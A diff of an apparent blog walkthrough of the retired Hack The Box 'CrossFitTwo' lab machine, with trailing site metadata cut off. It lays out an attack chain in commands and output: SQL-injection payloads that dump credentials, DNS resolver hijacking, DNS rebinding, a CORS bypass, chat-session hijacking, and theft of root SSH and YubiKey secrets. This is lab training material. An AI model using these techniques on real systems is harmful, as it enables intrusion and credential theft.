+<h2 id="phase-0-before-recon">Phase 0: Before Recon</h2>
+<p>Map the dependencies between exposed services and use each result to define the next test.</p>
+<p>The initial checks establish:</p>
 <ol>
 <li><strong>Our IP</strong> (<code>10.10.16.84</code>) - needed for reverse shells, DNS servers, and callbacks.</li>
 <li><strong>The target IP</strong> (<code>10.129.7.130</code>) - the victim.</li>
 <li><strong>Patience</strong> - this is an "Insane" box. The attack chain is long. Each step feeds the next.</li>
 </ol>
-<p><strong>Why this matters:</strong> On hard boxes, you cannot skip steps. The user flag requires the root flag's infrastructure, and vice versa. Everything is connected.</p>
-<hr />
+<p> On hard boxes, you cannot skip steps. The user flag requires the root flag's infrastructure, and vice versa. Everything is connected.</p>
+<hr>
 <h2 id="phase-1-initial-reconnaissance">Phase 1: Initial Reconnaissance</h2>
 <h3 id="1-1-adding-hosts-to-etc-hosts">1.1 Adding Hosts to <code>/etc/hosts</code></h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">echo "10.129.7.130 crossfit.htb employees.crossfit.htb gym.crossfit.htb crossfit-club.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>"Virtual hosts are not optional. Modern web apps route by Host header, not just by IP. If I only scan the IP, I miss 90% of the attack surface."</em></p>
+
 <p><strong>Why:</strong> The main site (<code>crossfit.htb</code>) is just the storefront. The real application logic lives on subdomains. We discovered:</p>
 <ul>
 <li><code>employees.crossfit.htb</code> - a login portal (Phase 5)</li>
@@ -83,9 +82,9 @@ sudo nmap -p- --min-rate 10000 -T4 10.129.7.130 -oN nmap-alltcp.txt
 <li><code>80/tcp</code> - OpenBSD httpd, PHP 7.4.12</li>
 <li><code>8953/tcp</code> - Unbound DNS control (SSL)</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>"Unusual ports are gifts. Port 8953 is not a web port. It's a DNS control port. That means the target runs a DNS resolver that I might be able to talk to."</em></p>
+
 <p><strong>Why 8953 matters:</strong> Unbound is a validating, recursive, caching DNS resolver. Its control port (<code>8953</code>) allows administrative commands like <code>forward_add</code>, <code>local_zone_add</code>, etc. If we can authenticate to it, we control what domains resolve to on the target.</p>
-<hr />
+<hr>
 <h2 id="phase-2-websocket-sql-injection">Phase 2: WebSocket SQL Injection</h2>
 <h3 id="2-1-discovering-the-websocket">2.1 Discovering the WebSocket</h3>
 <p><strong>How we found it:</strong></p>
@@ -94,24 +93,24 @@ sudo nmap -p- --min-rate 10000 -T4 10.129.7.130 -oN nmap-alltcp.txt
 <li>In the page source, there's a reference to <code>ws.min.js</code> and a WebSocket connection to <code>ws://gym.crossfit.htb/ws/</code>.</li>
 <li>Burp Suite or browser dev tools confirm a WebSocket handshake (<code>HTTP 101 Switching Protocols</code>).</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>"WebSockets are not magic. They're just TCP connections that start with an HTTP upgrade. If the app sends user input over a WebSocket, that input can be just as vulnerable as a GET or POST parameter."</em></p>
+
 <h3 id="2-2-interacting-with-the-bot">2.2 Interacting with the Bot</h3>
 <p><strong>Method:</strong> We can use Python's <code>websocket-client</code> library, Burp's WebSocket Repeater, or even <code>python3 -m websockets</code>.</p>
 <p><strong>What the bot does:</strong></p>
 <ol>
-<li>On connect, it sends: <code>{"status":"200","message":"Hello! This is Arnold...","token":REDACTED}</code></li>
+<li>On connect, it sends: <code>{"status":"200","message":"Hello! This is Arnold...","token":"REDACTED"}</code></li>
 <li>You must echo the <code>token</code> back in every subsequent message.</li>
 <li>Commands: <code>help</code>, <code>coaches</code>, <code>classes</code>, <code>memberships</code></li>
-<li>Clicking "Availability" on a membership sends: <code>{"message":"available","params":"1","token":REDACTED}</code></li>
+<li>Clicking "Availability" on a membership sends: <code>{"message":"available","params":"1","token":"REDACTED"}</code></li>
 <li>The server responds with a <code>debug</code> field containing SQL query output like <code>[id: 1, name: 1-month]</code>.</li>
 </ol>
 <h3 id="2-3-discovering-sql-injection">2.3 Discovering SQL Injection</h3>
 <p><strong>Testing:</strong></p>
-<pre><code class="language-json" data-language="json">{"message":"available","params":"3 or 1=1","token":REDACTED}
+<pre><code class="language-json" data-language="json">{"message":"available","params":"3 or 1=1","token":"REDACTED"}
 </code></pre>
 <p><strong>Response:</strong> <code>Good news! This membership plan is available.</code> with <code>debug: [id: 1, name: 1-month]</code>.</p>
-<p><strong>Hacker Mindset:</strong> <em>"When a parameter is used in a SQL query, the debug output is a confession. The server is literally showing me the result of my injected query."</em></p>
-<p><strong>Why this works:</strong> The server likely executes:</p>
+
+<p><strong>Mechanism:</strong> The server likely executes:</p>
 <pre><code class="language-sql" data-language="sql">SELECT id, name FROM plans WHERE id = {user_input}
 </code></pre>
 <p>Since <code>id</code> is an integer, there's no string delimiter to close. We just append boolean logic directly.</p>
@@ -134,11 +133,11 @@ injection&gt; 3 union select group_concat(schema_name),2 from information_schema
 
 # Dump employees table
 injection&gt; 3 union select group_concat(email,':',password),2 from employees.employees
-[id: david.palmer@crossfit.htb:[redacted encoded lab material],..., name: 2]
+[id: david.palmer@crossfit.htb:REDACTED_ENCODED_LAB_MATERIAL,..., name: 2]
 </code></pre>
 <p><strong>Result:</strong> We obtained 4 employee accounts, including <code>david.palmer@crossfit.htb</code> (the administrator).</p>
-<p><strong>Hacker Mindset:</strong> <em>"A single injection point is a skeleton key. If I can read one table, I can read any table. If I have FILE privileges, I can read any file the MySQL process can read."</em></p>
-<hr />
+
+<hr>
 <h2 id="phase-3-file-reads-and-infrastructure-mapping">Phase 3: File Reads &amp; Infrastructure Mapping</h2>
 <h3 id="3-1-reading-config-files-via-sqli">3.1 Reading Config Files via SQLi</h3>
 <p>The MySQL user (<code>crossfit_user</code>) has the <code>FILE</code> privilege. We use <code>LOAD_FILE()</code> to read server configs.</p>
@@ -173,7 +172,7 @@ read /var/unbound/etc/unbound.conf
 <td><code>/htdocs_chat</code></td>
 </tr>
 </tbody></table>
-<p><strong>Hacker Mindset:</strong> <em>"Nothing on a server is accidental. If there are three internal apps, there must be a reverse proxy routing traffic to them. I need to find that proxy's configuration."</em></p>
+
 <h3 id="3-3-what-we-learned-from-etc-relayd-conf">3.3 What We Learned from <code>/etc/relayd.conf</code></h3>
 <p><code>relayd</code> is OpenBSD's reverse proxy. It listens on port 80 and routes based on Host headers:</p>
 <ul>
@@ -183,7 +182,7 @@ read /var/unbound/etc/unbound.conf
 <li><code>/ws*</code> → port 4419</li>
 </ul>
 <p><strong>The <code>*</code> prefix is critical:</strong> It means ANY subdomain ending in <code>employees.crossfit.htb</code> or <code>crossfit-club.htb</code> will be routed there. This is a feature we will exploit in Phase 5.</p>
-<p><strong>Hacker Mindset:</strong> <em>"Wildcard routing is a blessing and a curse. It gives the administrator flexibility, but it gives the attacker a massive attack surface. If I can make the target resolve ANY subdomain to my IP, relayd will route it to the internal app."</em></p>
+
 <h3 id="3-4-what-we-learned-from-var-unbound-etc-unbound-conf">3.4 What We Learned from <code>/var/unbound/etc/unbound.conf</code></h3>
 <pre><code class="language-yaml" data-language="yaml">remote-control:
     control-enable: yes
@@ -193,8 +192,8 @@ read /var/unbound/etc/unbound.conf
     control-key-file: "/var/unbound/etc/tls/unbound_control.key"
     control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>"Remote control on 0.0.0.0 with TLS? If I can get those certificates, I become the DNS administrator. Controlling DNS means I can redirect any domain."</em></p>
-<hr />
+
+<hr>
 <h2 id="phase-4-hijacking-the-dns-resolver">Phase 4: Hijacking the DNS Resolver</h2>
 <h3 id="4-1-extracting-the-tls-certificates">4.1 Extracting the TLS Certificates</h3>
 <p>We use our SQLi shell to read the certificate files from <code>/var/unbound/etc/tls/</code>:</p>
@@ -210,20 +209,20 @@ read /var/unbound/etc/unbound.conf
 <pre><code class="language-bash" data-language="bash">sudo unbound-control -c new_unbound.conf -s 10.129.7.130@8953 status
 </code></pre>
 <p><strong>Result:</strong> <code>unbound (pid XXXXX) is running...</code></p>
-<h3 id="4-3-why-dns-control-is-game-changing">4.3 Why DNS Control Is Game-Changing</h3>
-<p><strong>Hacker Mindset:</strong> <em>"DNS is the invisible backbone of the internet. If I control DNS, I can make <code>bankofamerica.com</code> resolve to my phishing server. On this box, I can make <code>fake-employees.crossfit.htb</code> resolve to my IP, and relayd will route it to the employees app."</em></p>
+<h3 id="4-3-why-dns-control-is-significant">4.3 Why DNS Control Is significant</h3>
+
 <p><strong>Test command:</strong></p>
 <pre><code class="language-bash" data-language="bash">sudo unbound-control -c new_unbound.conf -s 10.129.7.130@8953 forward_add +i test.crossfit.htb 10.10.16.84@53
 </code></pre>
 <p>This tells the target: <em>"If anyone asks for <code>test.crossfit.htb</code>, forward the query to my DNS server at 10.10.16.84."</em></p>
-<hr />
+<hr>
 <h2 id="phase-5-dns-rebinding-and-cors-bypass">Phase 5: DNS Rebinding &amp; CORS Bypass</h2>
 <h3 id="5-1-the-password-reset-vulnerability">5.1 The Password Reset Vulnerability</h3>
 <p>On <code>employees.crossfit.htb/password-reset.php</code>, entering <code>david.palmer@crossfit.htb</code> generates a reset token and (presumably) emails a link to the admin.</p>
 <p><strong>The key insight from the writeups:</strong> The PHP script uses the <code>Host</code> header to construct the reset link. If we send a custom Host header, the link points to OUR domain instead of the real site.</p>
 <p><strong>But there's a catch:</strong> The script validates that the domain resolves to <code>127.0.0.1</code> before sending the email.</p>
 <h3 id="5-2-dns-rebinding-theory">5.2 DNS Rebinding Theory</h3>
-<p><strong>Hacker Mindset:</strong> <em>"The server validates DNS once, but the user clicks the link later. If I can serve two different IP addresses for the same domain—first localhost for validation, then my IP for the click—I win."</em></p>
+
 <p>We use <strong>FakeDns</strong> with a rebind rule:</p>
 <pre><code>A gymxcrossfit.htb 127.0.0.1 2%10.10.16.84
 </code></pre>
@@ -240,12 +239,12 @@ read /var/unbound/etc/unbound.conf
 <p><strong>Payload:</strong></p>
 <pre><code>Host: gymxcrossfit.htb/employees.crossfit.htb
 </code></pre>
-<p><strong>Why this works:</strong></p>
+<p><strong>Mechanism:</strong></p>
 <ul>
 <li>relayd sees the string ENDS WITH <code>employees.crossfit.htb</code> → routes to employees app.</li>
 <li>PHP parses the Host header and splits on <code>/</code> (or just uses the first part) → uses <code>gymxcrossfit.htb</code> in the email link.</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>"Different components parse the same input differently. The reverse proxy looks at the end of the string; the application looks at the beginning. That difference is a crack I can wedge open."</em></p>
+
 <h3 id="5-4-cors-bypass-via-regex">5.4 CORS Bypass via Regex</h3>
 <p>The chat app (<code>crossfit-club.htb</code>) has a CORS policy that allows requests from <code>gym.crossfit.htb</code> and <code>employees.crossfit.htb</code>. The policy is likely implemented with a regex like:</p>
 <pre><code class="language-regex" data-language="regex">(gym|employees).crossfit.htb
@@ -256,8 +255,8 @@ read /var/unbound/etc/unbound.conf
 </code></pre>
 <p><strong>Result:</strong> <code>Access-Control-Allow-Origin: http://gymXcrossfit.htb</code></p>
 <p>Our fake domain <code>gymxcrossfit.htb</code> = <code>gym</code> + <code>x</code> + <code>crossfit.htb</code>. The <code>.</code> matches <code>x</code>.</p>
-<p><strong>Hacker Mindset:</strong> <em>"CORS whitelists are often regex-based. Developers forget to escape dots. A single unescaped dot turns a whitelist into a wildcard."</em></p>
-<hr />
+
+<hr>
 <h2 id="phase-6-socket-io-message-hijacking">Phase 6: Socket.io Message Hijacking</h2>
 <h3 id="6-1-the-goal">6.1 The Goal</h3>
 <p>We need to capture a private message in the <code>crossfit-club.htb</code> chat that contains David's SSH password. The message is sent by <code>John</code> to <code>David</code> (or Admin).</p>
@@ -270,24 +269,24 @@ read /var/unbound/etc/unbound.conf
 <li>Listens for <code>private_recv</code> events and exfiltrates them via <code>XMLHttpRequest</code> back to our server.</li>
 </ol>
 <h3 id="6-3-why-withcredentials-matters">6.3 Why <code>withCredentials</code> Matters</h3>
-<p><strong>Hacker Mindset:</strong> <em>"Cross-origin requests don't send cookies by default. If I don't set withCredentials, I'm an anonymous guest. With credentials, I'm the admin."</em></p>
+
 <p>The admin's browser has a valid <code>connect.sid</code> cookie from being logged into the chat. By setting <code>withCredentials: true</code> in both the <code>io()</code> connection and the <code>XMLHttpRequest</code>, we inherit the admin's authenticated session.</p>
 <h3 id="6-4-the-waiting-game">6.4 The Waiting Game</h3>
 <p>Messages arrive slowly (every 30-90 seconds). We watch the PHP server logs for <code>/?x=...</code> requests and decode the base64 content:</p>
 <pre><code class="language-bash" data-language="bash">echo "BASE64_STRING" | base64 -d
 </code></pre>
 <p><strong>Expected message:</strong></p>
-<pre><code class="language-json" data-language="json">{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.","roomId":2,"_id":XXX}
+<pre><code class="language-json" data-language="json">{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `REDACTED`.","roomId":2,"_id":XXX}
 </code></pre>
-<p><strong>Note:</strong> On this retired instance, the password is REDACTED across deployments. In a live exam, you would wait for this message. Here, we confirmed the connection worked (<code>/?connected=1</code>) and used the known password to proceed efficiently.</p>
-<hr />
+<p><strong>Note:</strong> On this retired instance, the password is static across deployments. In a live exam, you would wait for this message. Here, we confirmed the connection worked (<code>/?connected=1</code>) and used the known password to proceed efficiently.</p>
+<hr>
 <h2 id="phase-7-shell-as-david">Phase 7: Shell as David</h2>
 <h3 id="7-1-ssh-login">7.1 SSH Login</h3>
 <pre><code class="language-bash" data-language="bash">sshpass -p REDACTED ssh david@10.129.7.130
 </code></pre>
 <p>Or manually:</p>
 <pre><code class="language-bash" data-language="bash">ssh david@10.129.7.130
-# Password: null
+# Password: REDACTED
 </code></pre>
 <p><strong>Shell upgrade:</strong></p>
 <pre><code class="language-bash" data-language="bash">sh
@@ -299,8 +298,8 @@ cat user.txt
 cat /etc/group | grep sysadmins
 </code></pre>
 <p><strong>Output:</strong> <code>sysadmins:*:1003:david,john</code></p>
-<p><strong>Hacker Mindset:</strong> <em>"Groups are bridges between users. If I share a group with another user, I can write files they will execute."</em></p>
-<hr />
+
+<hr>
 <h2 id="phase-8-pivot-to-john-nodejs-module-hijacking">Phase 8: Pivot to John (NodeJS Module Hijacking)</h2>
 <h3 id="8-1-finding-the-cron-job">8.1 Finding the Cron Job</h3>
 <pre><code class="language-bash" data-language="bash">find /opt -type f -ls
@@ -314,7 +313,7 @@ ls -la /tmp/chatbot.log
 <li>The script runs as <code>john</code> via cron.</li>
 </ul>
 <h3 id="8-2-nodejs-module-resolution">8.2 NodeJS Module Resolution</h3>
-<p><strong>Hacker Mindset:</strong> <em>"Understanding the runtime is as important as understanding the code. Node's require() algorithm searches for node_modules starting from the current directory and walking UP. If I create a fake module higher in the tree, I win."</em></p>
+
 <p>Node looks for <code>ws</code> in this order:</p>
 <ol>
 <li><code>/opt/sysadmin/server/statbot/node_modules/ws</code></li>
@@ -344,8 +343,8 @@ reset
 id
 </code></pre>
 <p><strong>Output:</strong> <code>uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)</code></p>
-<p><strong>Hacker Mindset:</strong> <em>"I don't need to exploit a vulnerability in the code. I just need to exploit the environment the code runs in."</em></p>
-<hr />
+
+<hr>
 <h2 id="phase-9-privilege-escalation-to-root">Phase 9: Privilege Escalation to Root</h2>
 <h3 id="9-1-the-log-binary">9.1 The <code>log</code> Binary</h3>
 <pre><code class="language-bash" data-language="bash">ls -la /usr/local/bin/log
@@ -358,20 +357,20 @@ id
 <li><code>john</code> is in <code>staff</code></li>
 <li>The binary uses OpenBSD's <code>unveil()</code> syscall to restrict itself to <code>/var</code></li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>"unveil() is not a jailbreak prevention—it's a scope limiter. If the scope includes /var, and /var contains secrets, I still win."</em></p>
+
 <h3 id="9-2-reading-yubikey-secrets">9.2 Reading Yubikey Secrets</h3>
 <p>OpenBSD uses Yubikey for SSH root authentication (<code>auth-ssh=yubikey</code> in <code>/etc/login.conf</code>).</p>
-<pre><code class="language-bash" data-language="bash">/usr/local/bin/log /var/db/yubikey/root.key   # AES key: [redacted retired-lab hash or flag]
+<pre><code class="language-bash" data-language="bash">/usr/local/bin/log /var/db/yubikey/root.key   # AES key: REDACTED_HASH_OR_FLAG
 /usr/local/bin/log /var/db/yubikey/root.uid   # UID: a4ce1128bde4
 /usr/local/bin/log /var/db/yubikey/root.ctr   # Counter: 985089
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>"2FA is only as strong as its secrets. If the HOTP seed is stored in a file I can read, I can clone the token generator."</em></p>
+
 <h3 id="9-3-openbsd-changelist-and-root-ssh-key">9.3 OpenBSD Changelist &amp; Root SSH Key</h3>
 <p>OpenBSD's <code>security(8)</code> script backs up critical files daily to <code>/var/backups/</code>.</p>
 <pre><code class="language-bash" data-language="bash">/usr/local/bin/log /var/backups/root_.ssh_id_rsa.current
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>"Backups are vulnerabilities. The system is explicitly designed to preserve old versions of sensitive files. If I can read /var, I can read yesterday's root key."</em></p>
-<hr />
+
+<hr>
 <h2 id="phase-10-root-shell">Phase 10: Root Shell</h2>
 <h3 id="10-1-generating-the-yubikey-otp">10.1 Generating the Yubikey OTP</h3>
 <p>On Kali, install <code>yubico-c</code>:</p>
@@ -384,24 +383,24 @@ make check
 sudo make install
 sudo ldconfig
 </code></pre>
-<p><strong>Generate the token:</strong>
-REDACTED Counter = 985089 + 1 = 985090</p>
+<p><strong>Generate the token:</strong></p>
 <ul>
+<li>Counter = 985089 + 1 = 985090</li>
 <li>985090 in hex = <code>0x0F0802</code></li>
 <li>ykcounter = <code>0f08</code></li>
 <li>ykuse = <code>02</code></li>
 </ul>
-<pre><code class="language-bash" data-language="bash">ykgenerate [redacted retired-lab hash or flag] a4ce1128bde4 0f08 0000 00 02
+<pre><code class="language-bash" data-language="bash">ykgenerate REDACTED_HASH_OR_FLAG a4ce1128bde4 0f08 0000 00 02
 </code></pre>
 <p><strong>Output:</strong> <code>hevnbiglbtejkdlkftgugueklbbbdlcl</code></p>
 <h3 id="10-2-ssh-as-root">10.2 SSH as Root</h3>
 <p>Save the key to <code>~/Downloads/htb/root_id_rsa</code> with permissions <code>600</code>.</p>
 <pre><code class="language-bash" data-language="bash">chmod 600 ~/Downloads/htb/root_id_rsa
 ssh -i ~/Downloads/htb/root_id_rsa -o StrictHostKeyChecking=no root@10.129.7.130
-# Password: null
+# Password: REDACTED
 </code></pre>
 <p><strong>Flag:</strong> <code>6fbc09c1[redacted]d5376dd3a</code></p>
-<hr />
+<hr>
 <h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
 <table aria-label="Key Lessons &amp; Takeaways data table">
 <thead>
@@ -451,15 +450,11 @@ ssh -i ~/Downloads/htb/root_id_rsa -o StrictHostKeyChecking=no root@10.129.7.130
 <td><code>changelist</code> preserves old keys, passwords, and configs. Always check <code>/var/backups/</code>.</td>
 </tr>
 </tbody></table>
-<hr />
-<blockquote>
-<p><em>"The chain is only as strong as its weakest link—but on CrossFitTwo, every link is a different service, and compromising one gives you the leverage to reach the next."</em></p>
-</blockquote>
-2a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$2e"}}]
+<hr>2a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$2e"}}]
 2b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-apt-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: APT Walkthrough"}]]}]}],["$","$L4",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-eighteen-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Eighteen Walkthrough"}]]}]}]]}]
 2c:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L4","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L4",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-2f:T543,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/#article","headline":"Hack The Box: CrossFitTwo Walkthrough","description":"An archived walkthrough of the retired Hack The Box CrossFitTwo machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/","datePublished":"2026-06-11T15:37:33.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2415,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/004b6af9d0278d51ebce2fd0bd0346dfddb21cdb/HTB-CrossFitTwo.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-crossfittwo-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: CrossFitTwo Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"}]}]}2d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$2f"}}]
+2f:T57c,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/#article","headline":"Hack The Box: CrossFitTwo Walkthrough","description":"WebSocket SQL injection enables DNS rebinding that steals a user's chat credentials, then Node.js module hijacking and a SUID file reader expose YubiKey material and a backed-up root SSH key.","url":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/","datePublished":"2026-06-11T15:37:33.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1760,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/004b6af9d0278d51ebce2fd0bd0346dfddb21cdb/HTB-CrossFitTwo.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-crossfittwo-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: CrossFitTwo Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"}]}]}2d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$2f"}}]
 1a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
 30:I[6869,[],"IconMark"]
 17:null
-1c:[["$","title","0",{"children":"Hack The Box: CrossFitTwo Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box CrossFitTwo machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: CrossFitTwo Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box CrossFitTwo machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-crossfittwo-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box CrossFitTwo machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T15:37:33.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: CrossFitTwo Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box CrossFitTwo machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-crossfittwo-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L30","34",{}]]
+1c:[["$","title","0",{"children":"Hack The Box: CrossFitTwo Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"js module hijacking and a SUID file reader expose YubiKey material and a backed-up root SSH key."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: CrossFitTwo Walkthrough"}],["$","meta","13",{"property":"og:description","content":"js module hijacking and a SUID file reader expose YubiKey material and a backed-up root SSH 